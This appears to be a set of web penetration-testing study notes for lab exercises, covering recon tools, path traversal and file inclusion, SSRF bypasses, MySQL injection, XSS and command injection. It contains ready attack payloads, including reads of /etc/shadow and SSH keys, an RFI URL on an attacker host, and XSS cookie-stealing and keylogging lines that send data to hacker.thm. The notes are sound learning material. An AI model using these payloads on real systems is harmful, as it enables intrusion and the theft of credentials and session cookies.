# Web

# Table of Contents
* [Tools](#Tools)
* [F12](#F12)
* [Content Discovery](#Content-Discovery)
* [Subdomain Enumeration](#Subdomain-Enumeration)
* [FFUF](#FFUF)
* [PHP](#PHP)
* [IDOR](#IDOR)
* [HTTP 302](#HTTP-302)
* [File Inclusion](#File-Inclusion)
* [SSRF](#SSRF)
* [SQL Injection](#SQL-Injection)
  * [MySQL](#MySQL)
* [XSS Injection](#XSS-Injection)
* [Command Injection](#Command-Injection)
* [XML Injection](#XML-Injection)

## Tools
* [HackBar](https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc) : A simple security audit / Penetration test tool for testing sql injections, XSS holes and site security.
* [Wayback Machine](https://archive.org/web/) : Explore web pages saved over time.
* [RequestBin](https://requestbin.com/) : Get a URL that collects requests you send it. (Can be used with XSS to get admin cookies)
* [Wappalyzer](https://www.wappalyzer.com/): Identify technologies on websites.
* [ffuf](https://github.com/ffuf/ffuf): Fast web fuzzer written in Go.
* [dirb](https://www.kali.org/tools/dirb/): Scan the web server for directories using a dictionary file.
* [gobuster](https://github.com/OJ/gobuster): Directory/File, DNS and VHost busting tool written in Go.
* [dnsrecon](https://www.kali.org/tools/dnsrecon/): DNS enumeration script.
* [Sublist3r](https://github.com/aboul3la/Sublist3r): Fast subdomains enumeration tool for penetration testers.
* [xsshunter](https://xsshunter.com/)
* [Burp Suite](https://portswigger.net/burp)
  * Proxy
    * [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)
    * Scoping: In "Target" tab, right-click the target and choose "Add To Scope" to disable logging of out of scope traffic; Go to "Proxy Options" and select "And URL Is in target scope" from the Intercept Client Requests section so proxy only intercept the target.
  * Repeater: Craft and/or relay intercepted requests to a target at will.
  * Intruder: Burp's builtin fuzzing tool.
    * Sniper: Takes one set of payloads. Good for single-position attacks.
    * Battering Ram: Takes one set of payloads. Puts the same payload in every position.
    * Pitchfork: Takes up to 20 sets of payloads and uses one payload set per position and iterates through them all once. It will stop when one of the lists is complete.
    * Cluster Bomb: Takes up to 20 sets of payloads and uses one payload set per position and iterates through each payload set individually (iterate through every possible combination of payloads).
  * Sequencer: Measure the entropy of "tokens".

## F12
* Check Network header/response
* Use console to do js function overwrite
* Debugger
  * Use "Pretty Print" option (looks like 2 braces {}) to make minimised file readable
  * Click on line number to set break points

## Content Discovery
* Manual
  * /robots.txt: Used by websites to communicate with web crawlers about which areas of the website should not be processed or scanned.
  * Favicon: The small picture in the website tab. If the website developer doesn't change it to a custom one, the favicon of the framework used by the website might be displayed.
    * `curl <favicon url> | md5sum`
    * Then lookup the md5 hash in [OWASP favicon database](https://wiki.owasp.org/index.php/OWASP_favicon_database)
  * /sitemap.xml: Gives a list of every file the website owner wishes to be listed on a search engine.
  * HTTP headers: Use `curl <website url> -v` to get the headers.
  * Framework: Check the framework documentation.
* OSINT
  * Google Hacking/Dorking: Google's advanced search engine
    * site:example.com
    * inurl:admin
    * filetype:pdf
    * intitle:admin
  * [Wayback Machine](https://archive.org/web/): Explore web pages saved over time.
  * [Wappalyzer](https://www.wappalyzer.com/): Identify technologies on websites.
  * Github
  * S3 Buckets: Storage service provided by Amazon AWS. The owner of the files can set permission to public, private and writable.
    * http(s)://{name}.s3.amazonaws.com
    * Common terms: {name}-assets, {name}-www, {name}-public, {name}-private, ...
* Automated
  * [SecLists](https://github.com/danielmiessler/SecLists): A wordlist that includes usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and more.
  * [ffuf](https://github.com/ffuf/ffuf)
    * `fuff -w <wordlist path> -u <url>/FUZZ`
  * [dirb](https://www.kali.org/tools/dirb/)
    * `dirb <url> <wordlist path>` 
  * [gobuster](https://github.com/OJ/gobuster)
    * `gobuster dir --url <url> -w <wordlist path>`

## Subdomain Enumeration
* https://en.wikipedia.org -> `en` is a subdomain of `wikipedia.org`
* SSL/TLS Certificate Transparency (CT) logs: Publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose is to stop malicious and accidentally made certificates from being used.
  * https://crt.sh/
  * https://transparencyreport.google.com/https/certificates
* `-site:www.domain.com site:*.domain.com` would only contain results leading to domain.com but excluding any links to www.domain.com
* DNS bruteforce: `dnsrecon -t brt -d <domain>`
* `./sublist3r.py -d <domain>`
* Some subdomains aren't hosted in publically accessible DNS results, such as development versions or administration portals. These DNS records could be kept on a private DNS server or recorded on the developer's machines in /etc/hosts file (C:\windows\system32\drivers\etc\hosts for Windows). The server knows which website the client wants from the **Host** header.
  * `fuff -w <wordlist path> -H "Host:FUZZ.<domain>" -u http://MACHINE_IP`: The -H switch adds/edits a header, using the FUZZ keyword in the space where a subdomain would normally go.
  * Add -fs {size} to filter out any results of the specified size.

## FFUF
* `-w`: Wordlist file path and (optional) keyword separated by colon.
  * /path/to/wordlist:KEYWORD
* `-u`: Target URL.
* `-H`: Header `"Name: Value"`, separated by colon.
* `-X`: HTTP method to use. Default value is GET.
* `-d`: POST data.
* `-fs`: Filter HTTP response size.
* `-fc`: Filter HTTP status codes from response.
* `-mr`: Match regexp.
* [Example Usage](https://github.com/ffuf/ffuf#example-usage)

## PHP
* [Magic Hashes](https://github.com/spaze/hashes)
  * For php, `'0e123' == '00e456' == '0'` since they all translate to float 0 (0e followed by digits is interpreted as scientific notation)
* `$_REQUEST` variable
  * An associative array that by default contains the contents of `$_GET`, `$_POST` and `$_COOKIE`.
  * If the same key name is used for both the query string and POST data, it will favour POST data field.
  * Can use `curl -d <POST data>` to add a parameter and overwrite the query string value if the application logic uses `$_REQUEST` to retrieve data.

## IDOR
* Insecure Direct Object Reference, a type of access control vulnerability
* It can occur when input data is not validated on the server-side to confirm the requested object belongs to the user requesting it
* Example: Changing the id number in http://online-service.thm/profile?user_id=1305

## HTTP 302
* **Moved Temporarily**, 可以簡單的理解為該資源原本確實存在，但已經被臨時改變了位置；換而言之，就是請求的資源暫時駐留在不同的URI下。
* `curl` only redirects when adding parameter `-L`
* Use `curl` to view the original page

## File Inclusion
* Path (Directory) Traversal: It occurs when user input is not validated and passed to a function such as `file_get_contents`.
  * `/etc/issue`
  * `/etc/profile`
  * `/proc/version`
  * `/etc/passwd`
  * `/etc/shadow`
  * `/root/.bash_history`
  * `/var/log/dmessage`
  * `/var/mail/root`
  * `/root/.ssh/id_rsa`
  * `/var/log/apache2/access.log`
  * `C:\boot.ini`
* Local File Inclusion (LFI): Using PHP functions such as `include`, `require`, `include_once`, `require_once`
  * `../../../../etc/passwd`
  * !`%00` no longer works with PHP 5.3.4 and above! If a file type is specified for the include function (ex. adding .php at the end), add a NULL byte (%00 or 0x00) at the end: `../../../../etc/passwd%00`
  * If keywords are being filtered (ex. `/etc/passwd`), there are two methods to bypass it: Null Byte `%00` and current directory trick `/etc/passwd/.`
  * If web application replaces `../` with empty string, use `....//....//....//....//etc/passwd` because PHP filter only matches and replaces the first subset string `../` it finds and doesn't do another pass: ..<s>../</s>/..<s>../</s>/..<s>../</s>/..<s>../</s>/etc/passwd -> ../../../../etc/passwd
  * If the developer forces the include to read from a defined directory, include the directory in the payload.
* Remote File Inclusion (RFI): Inject an external URL into `include` function. One requirement is that `allow_url_fopen` option needs to be `on`.
  * `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`

## SSRF
* Server-Side Request Forgery. Allows a malicious user to cause the webserver to make an additional or edited HTTP request to the source of the attacker's choosing.
* Blind SSRF: No information is returned to the attacker's screen. Use an external HTTP logging tool such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client to monitor requests.
```
       http://website.thm/stock?url=http://api.website.thm/api/usr             http://api.website.thm/api/usr
       ---------------------------------------------------------->             ------------------------------> 
Hacker                                                             website.thm                                 api.website.thm
       <----------------------------------------------------------             <------------------------------
       Website returns user data to Hacker                                     API Server returns user data to
                                                                               the website instead of stock
                                                                               information
```
* `http://website.thm/stock?url=/../user`
* When subdomain can be controlled: `http://website.thm/stock?server=api.website.thm/api/usr&x=&id=123` will request `http://api.website.thm/api/usr?x=.website.thm/api/stock/item?id=123` where `&x=` is used to stop the remaining path from being appended to the end of the attacker's URL.
* Finding an SSRF
  * A full URL is used in a parameter in the address bar
  * A hidden field in a form
  * A partial URL such as just the hostname
  * Path of the URL
* Bypass SSRF defenses
  * Deny List: If localhost and 127.0.0.1 is denied, use 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io
    * In cloud environment, 169.254.169.254 contains metadata for the deployed cloud server.
  * Allow List: An URL used in a parameter must begin with https://website.thm. Create a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm.
  * Open Redirect

## SQL Injection
### MySQL
* `'or 1 = 1 -- `
* 選取特定資料 : `'or 1 = 1 limit 1,1 -- `
  * 從offset=1開始選取前50筆資料(略過最前面1筆)
  * `limit 1,50`
* Wildcard `%`
  * `select * from users where username like 'a%';`: Returns any rows with username beginning with the letter a. 
* Blind sql injection
  * 有時候資料庫查詢只會顯示成功或失敗，不會顯示資料
  * 透過True/Flase回傳去判斷
    * `id = 'admin' and ascii(mid(password, 1, 1))>0 --` => True
    * `id = 'admin' and ascii(mid(password, 1, 1))>100 --` => False
    * `mid()` : 從字串索引值 start 開始截取共 length 長度的字串
  * 沒有回傳可以透過時間
    * `id = 'admin' and if(ascii(mid(password,1,1))>0, sleep(5), 1)=1`
    * if(condition, when_true, when_false)
* Bypass WAF
  * 對大小寫不敏感
  * 空白
    * /**/,%09, %0a, %0b, %0c, %0d, %a0
    * OR(1=1)
  * OR => ||, AND => &&
    * &直接傳過去是有特殊涵意的，例如?key1=value1&key2=value2
    * 用%26取代
  * = => LIKE
  * LIMIT 0,1 => LIMIT 1 OFFSET 0
* `@@version` : 同`version()`，回傳資料庫版本
* `user()` : 回傳使用者名稱
* `database()`: Get database name
* `information_schema`
  * SQL內建的資料庫，會儲存資料庫內部的資訊，例如所有table/column name
  * 透過leak information_schema取得想要的資料庫
  * databasename is at `information_schema.schemata`
  * tablename is at `information_schema.tables`
  * columnname is at `information_schema.columns`
  * leak database name
    * `'union select schema_name,1 from information_schema.schemata #`
    * can add `limit` to find certain information
  * leak table name
    * `'union select table_name,1 from information_schema.tables where table_schema like '$databasename'#`
  * leak column name
    * `'union select column_name,1 from information_schema.columns where table_name like '$tablename'#`
  * With the 3 information above found, leak the information
    * `'union select $columnname,1 from $databasename.$tablename#` 


## XSS Injection
* An injection attack where malicious JavaScript gets injected into a web application.
* Types of XSS
  * Reflected XSS: Attack script is reflected back to the user as part of a page from the victim site
    1. Victim visits malicious website
    2. Victim receives page with malicious link, ex. `http://victim.com/search.php?term=<script>...</script>`
    3. Victim clicks on link
    4. Victim receives page with injected scripts, ex. echo search term in response `<html>...Results for <script>...</script>`
    5. Victim sends valuable data to attacker
  * Stored XSS: The XSS payload is stored on the web application
    1. Attacker uploads malicious content to victim server
    2. Victim requests page from victim server
    3. Victim receives page with malicious content
    4. Victim sends valuable data to attacker
  * DOM Based XSS: The JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code.
    * Look for parts of the code that access certain variables that an attacker can have control over, ex. `window.location.x`
    * Then see how they are handled and whether the values are ever written to the web page's DOM or passed to functions like `eval()`
  * Blind XSS: Similar to a stored XSS but you can't see the payload working or be able to test against yourself first.
    * [xsshunter](https://xsshunter.com/)
* Payloads
  * Proof of concept: `<script>alert('hello');</script>`
  * Session Stealing: `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie) );</script>`
    * `btoa()`: Creates a Base64-encoded ASCII string from a "string" or binary data.
  * Key Logger: `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
  * Business Logic: `<script>user.changeEmail('attacker@hacker.thm');</script>`
  * Payload is inside other tags: `"><script>alert('hello');</script> 
    * `<h2>Hello, <input value="test"></h2>` -> `<h2>Hello, <input value=""><script>alert('hello');</script>"></h2>`
  * Payload is in textarea tags: `</textarea><script>alert('hello');</script>`
    * `<h2>Hello, <textarea>test</textarea></h2>` -> `<h2>Hello, <textarea></textarea><script>alert('hello');</script></textarea></h2>`
  * innerHTML: `';alert('hello');//`
    * `<script>document.getElementsByClassName('name')[0].innerHTML='test'</script>` -> `<script>document.getElementsByClassName('name')[0].innerHTML='';alert('hello');//';`
  * `script` is filterd: `<sscriptcript>alert('hello');</sscriptcript>`
  * Escape IMG tag and `<`, `>` are filtered: `/images/cat.jpg" onload="alert('hello');`
    * `<img src="images/cat.jpg">` -> `<img src="/images/cat.jpg" onload="alert('hello');">`
  * Polyglots

## Command Injection
* PHP functions that interact with the operating system to execute commands via shell: `exec`, `passthru`, `system`
* The shell operators `;`, `&`, `|`, `&&` will combine two (or more) system commands and execute them both
* Blind Command Injection: No output noticeable
  * Use payloads that cause some time delay: `ping` and `sleep`. Using `ping` will make the application hang for x seconds in relation to how many pings specified.
  * Forcing output: `>` + `cat`
  * `curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami`
* Verbose Command Injection: `ping` or `whoami`
* Useful Payloads
  * Linux
    * `whoami`, `ls`, `ping`, `sleep`, `nc`
  * Windows
    * `whoami`, `dir`, `ping`, `timeout` 
* Remediation
  * `<input type="text" id="ping" name="ping" pattern="[0-9]+"></input` will only accept a specific pattern of characters (0-9)
  * Sanitisation: `<?php if(!filter_input(INPUT_GET, "number", FILTER_VALIDATE_NUMBER)) {}` 
* [Cheat sheet](https://github.com/payloadbox/command-injection-payload-list)

## XML Injection
